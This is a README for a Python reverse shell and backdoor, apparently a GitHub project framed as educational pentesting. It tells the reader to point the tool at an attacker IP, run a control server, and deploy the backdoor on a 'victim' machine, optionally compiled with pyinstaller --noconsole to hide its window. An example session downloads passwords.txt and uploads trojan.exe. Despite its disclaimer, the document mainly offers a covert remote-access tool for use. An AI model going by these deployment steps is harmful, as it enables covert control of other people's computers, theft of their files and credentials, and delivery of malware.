
# 🛠️ Backdoor Connection Using Python

A lightweight reverse shell/backdoor built in Python for educational and authorized penetration testing purposes. It allows remote command execution, file transfer, and even capturing screenshots from a target machine.

> ⚠️ **Disclaimer:** This tool is created for educational and ethical use only. Use it only on systems you have explicit permission to test.

---

## 📌 Features

- ✅ Remote shell access
- ✅ Upload & download files
- ✅ Change directories
- ✅ Take screenshots remotely
- ✅ Cross-platform (Windows/Linux/macOS)
- ✅ Lightweight & easy to customize

---

## 📁 Project Structure

```
📦Backdoor-Connection-Using-Python
 ┣ 📜backdoor.py   # Script to be executed on the target machine
 ┣ 📜server.py     # Script run by the attacker to control the target
 ┗ 📜README.md     # Project documentation
```

---

## ⚙️ Requirements

- Python 3.x
- [Pillow](https://pypi.org/project/Pillow/) (for screenshots)

Install dependencies:

```bash
pip install pillow
```

---

## 🚀 Usage

### 1. Configure IP and Port

Update the following in both `server.py` and `backdoor.py`:

```python
SERVER_IP = "YOUR.ATTACKER.IP"
SERVER_PORT = 4444
```

### 2. Run the Server (Attacker)

```bash
python3 server.py
```

Wait for the incoming connection.

### 3. Deploy the Backdoor (Victim)

```bash
python3 backdoor.py
```

> Optionally, compile `backdoor.py` into an executable using `pyinstaller`:

```bash
pip install pyinstaller
pyinstaller --noconsole --onefile backdoor.py
```

---

## 💻 Available Commands

Once connected, use the following commands from the attacker's terminal:

| Command              | Description                             |
|----------------------|-----------------------------------------|
| `cd <path>`          | Change directory on the victim's system |
| `download <file>`    | Download file from victim to attacker   |
| `upload <file>`      | Upload file from attacker to victim     |
| `screenshot`         | Capture and save screenshot             |
| `clear`              | Clear the screen                        |
| `quit`               | Close the connection                    |

---

## 🧪 Example Session

```bash
> cd Desktop
> download passwords.txt
> upload trojan.exe
> screenshot
> quit
```

---

## 📷 Screenshot Example

![screenshot](https://via.placeholder.com/600x300?text=Remote+Screenshot+Captured)  
*Sample screenshot captured from target*

---

## 🧠 Learning Outcomes

- Python socket programming
- Remote shell and command execution
- File transmission over TCP
- Screenshot capture using Pillow
- Real-world ethical hacking tools

---

## 📜 License

This project is licensed under the [MIT License](LICENSE).

---

## 🙋‍♂️ Author

**Aryan Srivastava**  
[GitHub Profile »](https://github.com/aryanxsrivastava)

---

> ⭐ Star the repo if you found it useful!
